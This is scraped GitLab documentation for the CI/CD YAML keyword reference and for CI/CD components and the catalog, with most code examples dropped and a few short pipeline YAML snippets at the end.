Supported values: The name of the image, including the registry path if needed, in one of these formats:

CI/CD variables are supported.

Example of image:name:

Command or script to execute as the container’s entry point.

When the Docker container is created, the entrypoint is translated to the Docker --entrypoint option. The syntax is similar to the Dockerfile ENTRYPOINT directive, where each shell token is a separate string in the array.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

Example of image:entrypoint:

Use image:docker to pass options to runners using the Docker executor or the Kubernetes executor. This keyword does not work with other executor types.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

A hash of options for the Docker executor, which can include:

Example of image:docker:

Use image:kubernetes to pass options to the GitLab Runner Kubernetes executor. This keyword does not work with other executor types.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

A hash of options for the Kubernetes executor, which can include:

Example of image:kubernetes with only UID:

Example of image:kubernetes with both UID and GID:

The pull policy that the runner uses to fetch the Docker image.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

Examples of image:pull_policy:

Use inherit to control inheritance of default keywords and variables.

Use inherit:default to control the inheritance of default keywords.

Keyword type: Job keyword. You can use it only as part of a job.

Example of inherit:default:

Use inherit:variables to control the inheritance of default variables keywords.

Keyword type: Job keyword. You can use it only as part of a job.

Example of inherit:variables:

Use interruptible to configure the auto-cancel redundant pipelines feature to cancel a job before it completes if a new pipeline on the same ref starts for a newer commit. If the feature is disabled, the keyword has no effect. The new pipeline must be for a commit with new changes. For example, the Auto-cancel redundant pipelines feature has no effect if you select New pipeline in the UI to run a pipeline for the same commit.

The behavior of the Auto-cancel redundant pipelines feature can be controlled by the workflow:auto_cancel:on_new_commit setting.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

Example of interruptible with the default behavior:

In this example, a new pipeline causes a running pipeline to be:

Example of interruptible with the auto_cancel:on_new_commit:interruptible setting:

In this example, a new pipeline causes a running pipeline to cancel step-1 and step-3 if they are running or pending.

Use needs to execute jobs out-of-order. Relationships between jobs that use needs can be visualized as a directed acyclic graph.

You can ignore stage ordering and run some jobs without waiting for others to complete. Jobs in multiple stages can run concurrently.

Keyword type: Job keyword. You can use it only as part of a job.

This example creates four paths of execution:

When a job uses needs, it no longer downloads all artifacts from previous stages by default, because jobs with needs can start before earlier stages complete. With needs you can only download artifacts from the jobs listed in the needs configuration.

Use artifacts: true (default) or artifacts: false to control when artifacts are downloaded in jobs that use needs.

Keyword type: Job keyword. You can use it only as part of a job. Must be used with needs:job.

Example of needs:artifacts:

Use needs:project to download artifacts from up to five jobs in other pipelines. The artifacts are downloaded from the latest successful specified job for the specified ref. To specify multiple jobs, add each as separate array items under the needs keyword.

If there is a pipeline running for the ref, a job with needs:project does not wait for the pipeline to complete. Instead, the artifacts are downloaded from the latest successful run of the specified job.

needs:project must be used with job, ref, and artifacts.

Keyword type: Job keyword. You can use it only as part of a job.

Examples of needs:project:

In this example, build_job downloads the artifacts from the latest successful build-1 and build-2 jobs on the main branches in the group/project-name and group/project-name-2 projects.

You can use CI/CD variables in needs:project, for example:

A child pipeline can download artifacts from a successfully finished job in its parent pipeline or another child pipeline in the same parent-child pipeline hierarchy.

Keyword type: Job keyword. You can use it only as part of a job.

Example of needs:pipeline:job:

Parent pipeline (.gitlab-ci.yml):

Child pipeline (child.yml):

In this example, the create-artifact job in the parent pipeline creates some artifacts. The child-pipeline job triggers a child pipeline, and passes the CI_PIPELINE_ID variable to the child pipeline as a new PARENT_PIPELINE_ID variable. The child pipeline can use that variable in needs:pipeline to download artifacts from the parent pipeline. Having the create-artifact and child-pipeline jobs in subsequent stages ensures that the use-artifact job only executes when create-artifact has successfully finished.

To need a job that sometimes does not exist in the pipeline, add optional: true to the needs configuration. If not defined, optional: false is the default.

Jobs that use rules, only, or except and that are added with include might not always be added to a pipeline. GitLab checks the needs relationships before starting a pipeline:

Keyword type: Job keyword. You can use it only as part of a job.

Example of needs:optional:

You can mirror the pipeline status from an upstream pipeline to a job by using the needs:pipeline keyword. The latest pipeline status from the default branch is replicated to the job.

Keyword type: Job keyword. You can use it only as part of a job.

Example of needs:pipeline:

Jobs can use parallel:matrix to run a job multiple times in parallel in a single pipeline, but with different variable values for each instance of the job.

Use needs:parallel:matrix to execute jobs out-of-order depending on parallelized jobs.

Keyword type: Job keyword. You can use it only as part of a job. Must be used with needs:job.

Supported values: An array of hashes of matrix identifiers:

Example of needs:parallel:matrix:

The previous example generates the following jobs:

The linux:rspec job runs as soon as the linux:build: [aws, app1] job finishes.

The order of the matrix identifiers in needs:parallel:matrix must match the order of the matrix variables in the needed job. For example, reversing the order of the variables in the linux:rspec job in the previous example would be invalid:

Use pages to define a GitLab Pages job that uploads static content to GitLab. The content is then published as a website.

Keyword type: Job keyword or Job name (deprecated). You can use it only as part of a job.

This example renames the my-html-content/ directory to public/. This directory is exported as an artifact and published with GitLab Pages.

Example using a configuration hash:

This example does not move the directory, but uses the publish property directly. It also configures the pages deployment to be unpublished after a week.

Use pages.publish to configure the content directory of a pages job.

Keyword type: Job keyword. You can use it only as part of a pages job.

Supported values: A path to a directory containing the Pages content. In GitLab 17.10 and later, if not specified, the default public directory is used and if specified, this path is automatically appended to artifacts:paths.

Example of pages.publish:

This example uses Eleventy to generate a static website and output the generated HTML files into a the dist/ directory. This directory is exported as an artifact and published with GitLab Pages.

It is also possible to use variables in the pages.publish field. For example:

The publish path specified must be relative to the build root.

Use pages.path_prefix to configure a path prefix for parallel deployments of GitLab Pages.

Keyword type: Job keyword. You can use it only as part of a pages job.

The given value is converted to lowercase and shortened to 63 bytes. Everything except alphanumeric characters or periods is replaced with a hyphen. Leading and trailing hyphens or periods are not permitted.

Example of pages.path_prefix:

In this example, a different pages deployment is created for each branch.

Use expire_in to specify how long a deployment should be available before it expires. After the deployment is expired, it’s deactivated by a cron job running every 10 minutes.

By default, parallel deployments expire automatically after 24 hours. To disable this behavior, set the value to never.

Keyword type: Job keyword. You can use it only as part of a pages job.

Supported values: The expiry time. If no unit is provided, the time is in seconds. Variables are also supported. Valid values include:

Example of pages.expire_in:

Use parallel to run a job multiple times in parallel in a single pipeline.

Multiple runners must exist, or a single runner must be configured to run multiple jobs concurrently.

Parallel jobs are named sequentially from job_name 1/N to job_name N/N.

Keyword type: Job keyword. You can use it only as part of a job.

This example creates 5 jobs that run in parallel, named test 1/5 to test 5/5.

Use parallel:matrix to run a job multiple times in parallel in a single pipeline, but with different variable values for each instance of the job.

Multiple runners must exist, or a single runner must be configured to run multiple jobs concurrently.

Keyword type: Job keyword. You can use it only as part of a job.

Supported values: An array of hashes of variables:

Example of parallel:matrix:

The example generates 7 parallel deploystacks jobs, each with different values for PROVIDER and STACK:

parallel:matrix jobs add the matrix values to the job names to differentiate the jobs from each other, but large values can cause names to exceed limits:

You cannot create multiple matrix configurations with the same values but different names. Job names are generated from the matrix values, not the names, so matrix entries with identical values generate identical job names that overwrite each other.

For example, this test configuration would try to create two series of identical jobs, but the OS2 versions overwrite the OS versions:

Use release to create a release.

The release job must have access to the glab CLI, which must be in the $PATH.

If you use the Docker executor, you can use this image from the GitLab container registry: registry.gitlab.com/gitlab-org/cli:latest

If you use the Shell executor or similar, install glab CLI on the server where the runner is registered.

Keyword type: Job keyword. You can use it only as part of a job.

Supported values: The release subkeys:

Example of release keyword:

This example creates a release:

All release jobs, except trigger jobs, must include the script keyword. A release job can use the output from script commands. If you don’t need the script, you can use a placeholder:

An issue exists to remove this requirement.

The release section executes after the script keyword and before the after_script.

A release is created only if the job’s main script succeeds.

If the release already exists, it is not updated and the job with the release keyword fails.

Required. The Git tag for the release.

If the tag does not exist in the project yet, it is created at the same time as the release. New tags use the SHA associated with the pipeline.

Keyword type: Job keyword. You can use it only as part of a job.

CI/CD variables are supported.

Example of release:tag_name:

To create a release when a new tag is added to the project:

To create a release and a new tag at the same time, your rules should not configure the job to run only for new tags. A semantic versioning example:

If the tag does not exist, the newly created tag is annotated with the message specified by tag_message. If omitted, a lightweight tag is created.

Keyword type: Job keyword. You can use it only as part of a job.

Example of release:tag_message:

The release name. If omitted, it is populated with the value of release: tag_name.

Keyword type: Job keyword. You can use it only as part of a job.

Example of release:name:

The long description of the release.

Keyword type: Job keyword. You can use it only as part of a job.

Example of release:description:

The ref for the release, if the release: tag_name doesn’t exist yet.

Keyword type: Job keyword. You can use it only as part of a job.

The title of each milestone the release is associated with.

The date and time when the release is ready.

Example of release:released_at:

Use release:assets:links to include asset links in the release.

Example of release:assets:links:

Use resource_group to create a resource group that ensures a job is mutually exclusive across different pipelines for the same project.

For example, if multiple jobs that belong to the same resource group are queued simultaneously, only one of the jobs starts. The other jobs wait until the resource_group is free.

Resource groups behave similar to semaphores in other programming languages.

You can choose a process mode to strategically control the job concurrency for your deployment preferences. The default process mode is unordered. To change the process mode of a resource group, use the API to send a request to edit an existing resource group.

You can define multiple resource groups per environment. For example, when deploying to physical devices, you might have multiple physical devices. Each device can be deployed to, but only one deployment can occur per device at any given time.

Keyword type: Job keyword. You can use it only as part of a job.

Example of resource_group:

In this example, two deploy-to-production jobs in two separate pipelines can never run at the same time. As a result, you can ensure that concurrent deployments never happen to the production environment.

Use retry to configure how many times a job is retried if it fails. If not defined, defaults to 0 and jobs do not retry.

When a job fails, the job is processed up to two more times, until it succeeds or reaches the maximum number of retries.

By default, all failure types cause the job to be retried. Use retry:when or retry:exit_codes to select which failures to retry on.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

test_advanced will be retried up to 2 times if the exit code is 137 or if it had a runner system failure.

Use retry:when with retry:max to retry jobs for only specific failure cases. retry:max is the maximum number of retries, like retry, and can be 0, 1, or 2.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

Example of retry:when (single failure type):

If there is a failure other than a runner system failure, the job is not retried.

Example of retry:when (array of failure types):

Use retry:exit_codes with retry:max to retry jobs for only specific failure cases. retry:max is the maximum number of retries, like retry, and can be 0, 1, or 2.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

Example of retry:exit_codes:

You can specify the number of retry attempts for certain stages of job execution using variables.

Use rules to include or exclude jobs in pipelines.

Rules are evaluated when the pipeline is created, and evaluated in order. When a match is found, no more rules are checked and the job is either included or excluded from the pipeline depending on the configuration. If no rules match, the job is not added to the pipeline.

rules accepts an array of rules. Each rules must have at least one of:

Rules can also optionally be combined with:

You can combine multiple keywords together for complex rules.

The job is added to the pipeline:

The job is not added to the pipeline:

For additional examples, see Specify when jobs run with rules.

Use rules:if clauses to specify when to add a job to a pipeline:

if clauses are evaluated:

Keyword type: Job-specific and pipeline-specific. You can use it as part of a job to configure the job behavior, or with workflow to configure the pipeline behavior.

Use rules:changes to specify when to add a job to a pipeline by checking for changes to specific files.

For new branch pipelines or when there is no Git push event, rules: changes always evaluates to true and the job always runs. Pipelines like tag pipelines, scheduled pipelines, and manual pipelines, all do not have a Git push event associated with them. To cover these cases, use rules: changes: compare_to to specify the branch to compare against the pipeline ref.

If you do not use compare_to, you should use rules: changes only with branch pipelines or merge request pipelines, though rules: changes still evaluates to true when creating a new branch. With:

Keyword type: Job keyword. You can use it only as part of a job.

An array including any number of:

Example of rules:changes:

Use rules:changes to specify that a job only be added to a pipeline when specific files are changed, and use rules:changes:paths to specify the files.

rules:changes:paths is the same as using rules:changes without any subkeys. All additional details and related topics are the same.

Keyword type: Job keyword. You can use it only as part of a job.

Example of rules:changes:paths:

In this example, both jobs have the same behavior.

Use rules:changes:compare_to to specify which ref to compare against for changes to the files listed under rules:changes:paths.

Keyword type: Job keyword. You can use it only as part of a job, and it must be combined with rules:changes:paths.

CI/CD variables are supported.

Example of rules:changes:compare_to:

In this example, the docker build job is only included when the Dockerfile has changed relative to refs/heads/branch1 and the pipeline source is a merge request event.

Use exists to run a job when certain files or directories exist in the repository.

Keyword type: Job keyword. You can use it as part of a job or an include.

Example of rules:exists:

rules:exists:paths is the same as using rules:exists without any subkeys. All additional details are the same.

Keyword type: Job keyword. You can use it as part of a job or an include.

Example of rules:exists:paths:

In this example, both jobs have the same behavior.

Use rules:exists:project to specify the location in which to search for the files listed under rules:exists:paths. Must be used with rules:exists:paths.

Keyword type: Job keyword. You can use it as part of a job or an include, and it must be combined with rules:exists:paths.

Example of rules:exists:project:

In this example, the docker build job is only included when the Dockerfile exists in the project my-group/my-project on the commit tagged with v1.0.0.

Use rules:when alone or as part of another rule to control conditions for adding a job to a pipeline. rules:when is similar to when, but with slightly different input options.

If a rules:when rule is not combined with if, changes, or exists, it always matches if reached when evaluating a job’s rules.

Keyword type: Job-specific. You can use it only as part of a job.

Example of rules:when:

In this example, job1 is added to pipelines:

Use allow_failure: true in rules to allow a job to fail without stopping the pipeline.

You can also use allow_failure: true with a manual job. The pipeline continues running without waiting for the result of the manual job. allow_failure: false combined with when: manual in rules causes the pipeline to wait for the manual job to run before continuing.

Keyword type: Job keyword. You can use it only as part of a job.

Example of rules:allow_failure:

If the rule matches, then the job is a manual job with allow_failure: true.

Use needs in rules to update a job’s needs for specific conditions. When a condition matches a rule, the job’s needs configuration is completely replaced with the needs in the rule.

Keyword type: Job-specific. You can use it only as part of a job.

Example of rules:needs:

Use variables in rules to define variables for specific conditions.

Keyword type: Job-specific. You can use it only as part of a job.

Example of rules:variables:

Use interruptible in rules to update a job’s interruptible value for specific conditions.

Keyword type: Job-specific. You can use it only as part of a job.

Example of rules:interruptible:

This feature is available for testing, but not ready for production use.

Use run to define a series of steps to be executed in a job. Each step can be either a script or a predefined step.

You can also provide optional environment variables and inputs.

Keyword type: Job keyword. You can use it only as part of a job.

Each array entry must have a name, and one script or step (but not both).

In this example, the job has two steps:

Use script to specify commands for the runner to execute.

All jobs except trigger jobs require a script keyword.

Keyword type: Job keyword. You can use it only as part of a job.

Supported values: An array including:

CI/CD variables are supported.

Use secrets to specify CI/CD secrets to:

Use secrets:vault to specify secrets provided by a HashiCorp Vault.

Keyword type: Job keyword. You can use it only as part of a job.

Example of secrets:vault:

To specify all details explicitly and use the KV-V2 secrets engine:

You can shorten this syntax. With the short syntax, engine:name and engine:path both default to kv-v2:

To specify a custom secrets engine path in the short syntax, add a suffix that starts with @:

Use secrets:gcp_secret_manager to specify secrets provided by GCP Secret Manager.

Keyword type: Job keyword. You can use it only as part of a job.

Example of secrets:gcp_secret_manager:

Use secrets:azure_key_vault to specify secrets provided by a Azure Key Vault.

Keyword type: Job keyword. You can use it only as part of a job.

Example of secrets:azure_key_vault:

Use secrets:file to configure the secret to be stored as either a file or variable type CI/CD variable

By default, the secret is passed to the job as a file type CI/CD variable. The value of the secret is stored in the file and the variable contains the path to the file.

If your software can’t use file type CI/CD variables, set file: false to store the secret value directly in the variable.

Keyword type: Job keyword. You can use it only as part of a job.

Example of secrets:file:

Use secrets:token to explicitly select a token to use when authenticating with the external secrets provider by referencing the token’s CI/CD variable.

Keyword type: Job keyword. You can use it only as part of a job.

Example of secrets:token:

Use services to specify any additional Docker images that your scripts require to run successfully. The services image is linked to the image specified in the image keyword.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

Supported values: The name of the services image, including the registry path if needed, in one of these formats:

CI/CD variables are supported, but not for alias.

In this example, GitLab launches two containers for the job:

Use services:docker to pass options to the Docker executor of a GitLab Runner.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

A hash of options for the Docker executor, which can include:

Example of services:docker:

Use services:kubernetes to pass options to the GitLab Runner Kubernetes executor.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

A hash of options for the Kubernetes executor, which can include:

Example of services:kubernetes with only UID:

Example of services:kubernetes with both UID and GID:

The pull policy that the runner uses to fetch the Docker image. Requires GitLab Runner 15.1 or later.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

Examples of services:pull_policy:

Use stage to define which stage a job runs in. Jobs in the same stage can execute in parallel (see Additional details).

If stage is not defined, the job uses the test stage by default.

Keyword type: Job keyword. You can use it only as part of a job.

Supported values: A string, which can be a:

Use the .pre stage to make a job run at the start of a pipeline. By default, .pre is the first stage in a pipeline. User-defined stages execute after .pre. You do not have to define .pre in stages.

If a pipeline contains only jobs in the .pre or .post stages, it does not run. There must be at least one other job in a different stage.

Keyword type: You can only use it with a job’s stage keyword.

Example of stage: .pre:

Use the .post stage to make a job run at the end of a pipeline. By default, .post is the last stage in a pipeline. User-defined stages execute before .post. You do not have to define .post in stages.

If a pipeline contains only jobs in the .pre or .post stages, it does not run. There must be at least one other job in a different stage.

Keyword type: You can only use it with a job’s stage keyword.

Example of stage: .post:

Use tags to select a specific runner from the list of all runners that are available for the project.

When you register a runner, you can specify the runner’s tags, for example ruby, postgres, or development. To pick up and run a job, a runner must be assigned every tag listed in the job.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

In this example, only runners with both the ruby and postgres tags can run the job.

Use timeout to configure a timeout for a specific job. If the job runs for longer than the timeout, the job fails.

The job-level timeout can be longer than the project-level timeout, but can’t be longer than the runner’s timeout.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

Supported values: A period of time written in natural language. For example, these are all equivalent:

Use trigger to declare that a job is a “trigger job” which starts a downstream pipeline that is either:

Trigger jobs can use only a limited set of GitLab CI/CD configuration keywords. The keywords available for use in trigger jobs are:

Keyword type: Job keyword. You can use it only as part of a job.

Use trigger:inputs to set the inputs for a multi-project pipeline when the downstream pipeline configuration uses spec:inputs.

Example of trigger:inputs:

Use trigger:include to declare that a job is a “trigger job” which starts a child pipeline.

Keyword type: Job keyword. You can use it only as part of a job.

Example of trigger:include:

trigger:include:artifact to trigger a dynamic child pipeline.

trigger:include:inputs to set the inputs when the downstream pipeline configuration uses spec:inputs.

trigger:include:local for a path to a child pipeline configuration file when:

Combining multiple child pipeline configuration files.

Combined with trigger:include:inputs to pass inputs to the child pipeline. For example:

trigger:include:project to trigger a child pipeline with a configuration file in a different project. If the file contains additional include entries, GitLab looks for the files in the project running the pipeline, not the project hosting the file.

trigger:include:template to trigger a child pipeline with a CI/CD template.

Use trigger:include:inputs to set the inputs for a child pipeline when the downstream pipeline configuration uses spec:inputs.

Example of trigger:inputs:

Use trigger:project to declare that a job is a “trigger job” which starts a multi-project pipeline.

By default, the multi-project pipeline triggers for the default branch. Use trigger:branch to specify a different branch.

Keyword type: Job keyword. You can use it only as part of a job.

Example of trigger:project:

Example of trigger:project for a different branch:

Use trigger:strategy to force the trigger job to wait for the downstream pipeline to complete before it is marked as success.

This behavior is different than the default, which is for the trigger job to be marked as success as soon as the downstream pipeline is created.

This setting makes your pipeline execution linear rather than parallel.

Example of trigger:strategy:

In this example, jobs from subsequent stages wait for the triggered pipeline to successfully complete before starting.

Use trigger:forward to specify what to forward to the downstream pipeline. You can control what is forwarded to both parent-child pipelines and multi-project pipelines.

Forwarded variables do not get forwarded again in nested downstream pipelines by default, unless the nested downstream trigger job also uses trigger:forward.

Example of trigger:forward:

Run this pipeline manually, with the CI/CD variable MYVAR = my value:

Use when to configure the conditions for when jobs run. If not defined in a job, the default value is when: on_success.

Keyword type: Job keyword. You can use it as part of a job. when: always and when: never can also be used in workflow:rules.

In this example, the script:

Use manual_confirmation with when: manual to define a custom confirmation message for manual jobs. If no manual job is defined with when: manual, this keyword has no effect.

Manual confirmation works with all manual jobs, including environment stop jobs that use environment:action: stop.

Keyword type: Job keyword. You can use it only as part of a job.

Example of manual_confirmation:

Use start_in to delay the execution of a job for a specified duration after the job is created. You must configure when: delayed for the job.

Keyword type: Job keyword. You can use it only as part of a job.

Possible inputs: A period of time in seconds, minutes, or hours. Must be less than or equal to one week. Examples of valid values:

In this example, the deploy_production job starts 30 minutes after the previous stage completes.

Use variables to define CI/CD variables.

Variables can be defined in a CI/CD job, or as a top-level (global) keyword to define default CI/CD variables for all jobs.

You can use job variables in commands in the job’s script, before_script, or after_script sections, and also with some job keywords. Check the Supported values section of each job keyword to see if it supports variables.

You cannot use job variables as values for global keywords like include.

Supported values: Variable name and value pairs:

CI/CD variables are supported.

Example of job variables:

Variables defined in a top-level variables section act as default variables for all jobs.

Each default variable is made available to every job in the pipeline, except when the job already has a variable defined with the same name. The variable defined in the job takes precedence, so the value of the default variable with the same name cannot be used in the job.

Like job variables, you cannot use default variables as values for other global keywords, like include.

Supported values: Variable name and value pairs:

CI/CD variables are supported.

Examples of variables:

Use the description keyword to define a description for a default variable. The description displays with the prefilled variable name when running a pipeline manually.

Keyword type: You can only use this keyword with default variables, not job variables.

Example of variables:description:

Use the value keyword to define a pipeline-level (default) variable’s value. When used with variables: description, the variable value is prefilled when running a pipeline manually.

Keyword type: You can only use this keyword with default variables, not job variables.

Example of variables:value:

Use variables:options to define an array of values that are selectable in the UI when running a pipeline manually.

Must be used with variables: value, and the string defined for value:

If there is no description, this keyword has no effect.

Keyword type: You can only use this keyword with default variables, not job variables.

Example of variables:options:

Use the expand keyword to configure a variable to be expandable or not.

Keyword type: You can use this keyword with both default and job variables.

Example of variables:expand:

**Examples:**

Example 1 (unknown):
```unknown
default:
  image: ruby:3.0
  retry: 2

rspec:
  script: bundle exec rspec

rspec 2.7:
  image: ruby:2.7
  script: bundle exec rspec
```

Example 2 (unknown):
```unknown
include:
  - component: $CI_SERVER_FQDN/my-org/security-components/secret-detection@1.0
```

Example 3 (unknown):
```unknown
include:
  - local: '/templates/.gitlab-ci-template.yml'
```

Example 4 (unknown):
```unknown
include: '.gitlab-ci-production.yml'
```

---

## CI/CD components

**URL:** https://docs.gitlab.com/ci/components/

**Contents:**
- CI/CD components
- Component project
  - Create a component project
  - Directory structure
- Use a component
  - Component versions
    - Partial semantic versions
- Write a component
  - Manage dependencies
  - Write a clear README.md

A CI/CD component is a reusable single pipeline configuration unit. Use components to create a small part of a larger pipeline, or even to compose a complete pipeline configuration.

A component can be configured with input parameters for more dynamic behavior.

CI/CD components are similar to the other kinds of configuration added with the include keyword, but have several advantages:

Instead of creating your own components, you can also search for published components that have the functionality you need in the CI/CD Catalog.

For an introduction and hands-on examples, see Efficient DevSecOps workflows with reusable CI/CD components.

For common questions and additional support, see the FAQ: GitLab CI/CD Catalog blog post.

A component project is a GitLab project with a repository that hosts one or more components. All components in the project are versioned together, with a maximum of 30 components per project.

If a component requires different versioning from other components, the component should be moved to a dedicated component project.

To create a component project, you must:

Create a new project with a README.md file:

Components published to the CI/CD catalog use both the description and avatar when displaying the component project’s summary.

Add a YAML configuration file for each component, following the required directory structure. For example:

You can use the component immediately, but you might want to consider publishing the component to the CI/CD catalog.

The repository must contain:

Optionally, each component can also have its own README.md file that provides more detailed information, and can be linked from the top-level README.md file. This helps to provide a better overview of your component project and how to use it.

If the project contains a single component, the directory structure should be similar to:

If the project contains multiple components, then the directory structure should be similar to:

If you are a member of a parent group that contains the current group or project:

To add a component to a project’s CI/CD configuration, use the include: component keyword. The component reference is formatted as <fully-qualified-domain-name>/<project-path>/<component-name>@<specific-version>, for example:

Pipeline configuration and component configuration are not processed independently. When a pipeline starts, any included component configuration merges into the pipeline’s configuration. If your pipeline and the component both contain configuration with the same name, they can interact in unexpected ways.

For example, two jobs with the same name would merge together into a single job. Similarly, a component using extends for configuration with the same name as a job in your pipeline could extend the wrong configuration. Make sure your pipeline and the component do not share any configuration with the same name, unless you intend to override the component’s configuration.

To use GitLab.com components on a GitLab Self-Managed instance, you must mirror the component project.

If a component requires the use of tokens, passwords, or other sensitive data to function, be sure to audit the component’s source code to verify that the data is only used to perform actions that you expect and authorize. You should also use tokens and secrets with the minimum permissions, access, or scope required to complete the action.

In order of highest priority first, the component version can be:

You can use any version supported by the component, but using a version published to the CI/CD catalog is recommended. The version referenced with a commit SHA or branch name might not be published in the CI/CD catalog, but could be used for testing.

You can use partial semantic version numbers and the keyword ~latest when referencing a CI/CD catalog component to select the latest published version that matches your specification.

These formats only work with published CI/CD catalog components, not with regular project components. This ensures that when you use formats like 1.2 or ~latest, you only pull components that have been validated and published to the catalog, rather than potentially untested code from any repository.

This approach offers significant benefits for both consumers and authors of components:

For example, a component has versions: 1.0.0, 1.1.0, 1.1.1, 1.2.0, 2.0.0, 2.0.1, 2.1.0

When referencing the component:

Pre-release versions are never fetched when using partial version selection. To fetch a pre-release version, specify the full version, for example 1.0.1-rc.

This section describes some best practices for creating high quality component projects.

While it’s possible for a component to use other components in turn, make sure to carefully select the dependencies. To manage dependencies, you should:

Each component project should have clear and comprehensive documentation. To write a good README.md file:

If a component needs more instructions, add additional documentation in a Markdown file in the component directory and link to it from the main README.md file. For example:

For an example, see the AWS components README.

Testing CI/CD components as part of the development workflow is strongly recommended and helps ensure consistent behavior.

Test changes in a CI/CD pipeline (like any other project) by creating a .gitlab-ci.yml in the root directory. Make sure to test both the behavior and potential side-effects of the component. You can use the GitLab API if needed.

After committing and pushing changes, the pipeline tests the component, then creates a release if the earlier jobs pass.

Authentication is necessary if the project is private.

In some cases, components require source files to interact with. For example, a component that builds Go source code likely needs some samples of Go to test against. Alternatively, a component that builds Docker images likely needs some sample Dockerfiles to test against.

You can include sample files like these directly in the component project, to be used during component testing.

You can learn more in examples for testing a component.

When using another component in your component, use $CI_SERVER_FQDN instead of your instance’s Fully Qualified Domain Name (like gitlab.com).

When accessing the GitLab API in your component, use the $CI_API_V4_URL instead of the full URL and path for your instance (like https://gitlab.com/api/v4).

These predefined variables ensure that your component also works when used on another instance, for example when using a GitLab.com component on a GitLab Self-Managed instance.

Ensure that the component and its testing pipeline work also on GitLab Self-Managed. While some API resources of public projects on GitLab.com could be accessed via unauthenticated requests on a GitLab Self-Managed instance a component project could be mirrored as private or internal project.

It’s important that an access token can optionally be provided via inputs or variables to authenticate requests on GitLab Self-Managed instances.

Avoid using global keywords in a component. Using these keywords in a component affects all jobs in a pipeline, including jobs directly defined in the main .gitlab-ci.yml or in other included components.

As an alternative to global keywords:

For example, avoid using the default global keyword:

Add the configuration to each job explicitly:

Use extends to reuse configuration:

Avoid using hardcoded values in CI/CD components. Hardcoded values might force component users to need to review the component’s internal details and adapt their pipeline to work with the component.

A common keyword with problematic hard-coded values is stage. If a component job’s stage is hardcoded, all pipelines using the component must either define the exact same stage, or override the configuration.

The preferred method is to use the input keyword for dynamic component configuration. The component user can specify the exact value they need.

For example, to create a component with stage configuration that can be defined by users:

In the component configuration:

In a project using the component:

Similar to the values for the stage keyword, you should avoid hard-coding job names in CI/CD components. When your component’s users can customize job names, they can prevent conflicts with the existing names in their pipelines. Users could also include a component multiple times with different input options by using different names.

Use inputs to allow your component’s users to define a specific job name, or a prefix for the job name. For example:

When using CI/CD variables in a component, evaluate if the inputs keyword should be used instead. Avoid asking users to define custom variables to configure components when inputs is a better solution.

Inputs are explicitly defined in the component’s spec section, and have better validation than variables. For example, if a required input is not passed to the component, GitLab returns a pipeline error. By contrast, if a variable is not defined, its value is empty, and there is no error.

For example, use inputs instead of variables to configure a scanner’s output format:

In the component configuration:

In the project using the component:

In other cases, CI/CD variables might still be preferred. For example:

The CI/CD Catalog is a list of projects with published CI/CD components you can use to extend your CI/CD workflow.

Anyone can create a component project and add it to the CI/CD Catalog, or contribute to an existing project to improve the available components.

For a click-through demo, see the CI/CD Catalog beta Product Tour.

To access the CI/CD Catalog and view the published components that are available to you:

Alternatively, if you are already in the pipeline editor in your project, you can select CI/CD Catalog.

Visibility of components in the CI/CD catalog follows the component source project’s visibility setting. Components with source projects set to:

To publish a component project in the CI/CD catalog, you must:

To make published versions of a component project visible in the CI/CD catalog, you must set the project as a catalog project.

To set the project as a catalog project:

The project only becomes findable in the catalog after you publish a new release.

To use automation to enable this setting, you can use the mutationcatalogresourcescreate GraphQL endpoint. Issue 463043 proposes to expose this in the REST API as well.

CI/CD components can be used without being listed in the CI/CD catalog. However, publishing a component’s releases in the catalog makes it discoverable to other users.

To publish a new version of the component to the catalog:

Add a job to the project’s .gitlab-ci.yml file that uses the release keyword to create the new release when a tag is created. You should configure the tag pipeline to test the components before running the release job. For example:

Create a new tag for the release, which should trigger a tag pipeline that contains the job responsible for creating the release. The tag must use semantic versioning.

After the release job completes successfully, the release is created and the new version is published to the CI/CD catalog.

When tagging and releasing new versions of components to the Catalog, you must use semantic versioning. Semantic versioning is the standard for communicating that a change is a major, minor, patch, or other kind of change.

For example, 1.0.0, 2.3.4, and 1.0.0-alpha are all valid semantic versions.

To remove a component project from the catalog, turn off the CI/CD Catalog resource toggle in the project settings.

This action destroys the metadata about the component project and its versions published in the catalog. The project and its repository still exist, but are not visible in the catalog.

To publish the component project in the catalog again, you need to publish a new release.

Some CI/CD components are badged with an icon to show that the component was created and is maintained by users verified by GitLab or the instance administrator:

GitLab-maintained ( tanuki-verified ): GitLab.com components that are created and maintained by GitLab.

GitLab Partner ( partner-verified ): GitLab.com components that are independently created and maintained by a GitLab-verified partner.

GitLab partners can contact a member of the GitLab Partner Alliance to have their namespace on GitLab.com flagged as GitLab-verified. Then any CI/CD components located in the namespace are badged as GitLab Partner components. The Partner Alliance member creates an internal request issue (GitLab team members only) on behalf of the verified partner.

GitLab Partner-created components are provided as-is, without warranty of any kind. An end user’s use of a GitLab Partner-created component is at their own risk and GitLab shall have no indemnification obligations nor any liability of any type with respect to the end user’s use of the component. The end user’s use of such content and any liability related thereto shall be between the publisher of the content and the end user.

Verified creator ( check-sm ): Components created and maintained by a user verified by an administrator.

A GitLab administrator can set a CI/CD component as created and maintained by a verified creator:

Open GraphiQL in the instance with your administrator account, for example at: https://gitlab.example.com/-/graphql-explorer.

Run this query, replacing root-level-group with the root namespace of the component to verify:

After the query completes, all components in projects in the root namespace are verified. The Verified creator badge displays next to the component names in the CI/CD catalog.

To remove the badge from a component, repeat the query with UNVERIFIED for verificationLevel.

Any existing CI/CD template that you use in projects by using the include: syntax can be converted to a CI/CD component:

You can learn more by following a practical example for migrating the Go CI/CD template to CI/CD component.

The CI/CD catalog of a fresh install of a GitLab instance starts with no published CI/CD components. To populate your instance’s catalog, you can:

To mirror a GitLab.com component in your GitLab Self-Managed instance:

